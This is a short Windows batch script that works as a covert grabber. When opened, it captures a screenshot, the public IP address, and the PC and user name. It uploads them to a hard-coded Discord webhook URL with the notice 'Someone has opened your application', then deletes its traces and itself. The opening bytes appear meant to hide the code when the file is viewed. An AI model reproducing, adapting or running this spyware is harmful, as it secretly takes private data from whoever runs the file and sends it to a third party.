��&cls
��
@echo off
set "webhook=https://discord.com/api/webhooks/1257436567140565075/Ba8FogyFvUTbJE1k904qTvmChrmPNmRTqyQQfqwW_QdaEuz21bO3msVSRRuLk8zkhOJ0"
set "rng=%random%_%random%%random%"
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $s=[System.Windows.Forms.Screen]::PrimaryScreen;$b=New-Object System.Drawing.Bitmap $s.Bounds.Width, $s.Bounds.Height;$g=[System.Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size);$b.Save('%temp%\%rng%.png',[System.Drawing.Imaging.ImageFormat]::Png);$g.Dispose();$b.Dispose();"
for /f %%i in ('curl -s https://api.ipify.org') do set ip=%%i
for /f "tokens=*" %%i in ('whoami') do set "info=%%i"
set "info=%info:\=\nUsername: %"
for /f "tokens=1-3 delims=-" %%a in ('date /t') do (set "d=%%c-%%a-%%b")
for /f "tokens=1-2 delims=:" %%a in ('time /t') do (set "t=%%a:%%b")
curl -s -k -H "Content-Type: multipart/form-data" -F "file=@%temp%\%rng%.png" -F "payload_json={\"embeds\":[{\"title\":\"Information\",\"description\":\"Someone has opened your application:\n\nScript Name: %~nx0\nIP: %ip%\nPC Name: %info%\n\nDate: %d%\nTime: %t%\n\nScreenshot:\",\"color\":7506394,\"image\":{\"url\":\"attachment://%rng%.png\"}}]}" %webhook% >nul 2>&1
if exist "%temp%\%rng%.png" del "%temp%\%rng%.png" >nul
set "ip=" & set "info=" & set "rng=" & set "d=" & set "t=" & set "webhook=Couldnt find webhook. Exit code: Haha loser get good ez."
del %0
exit /b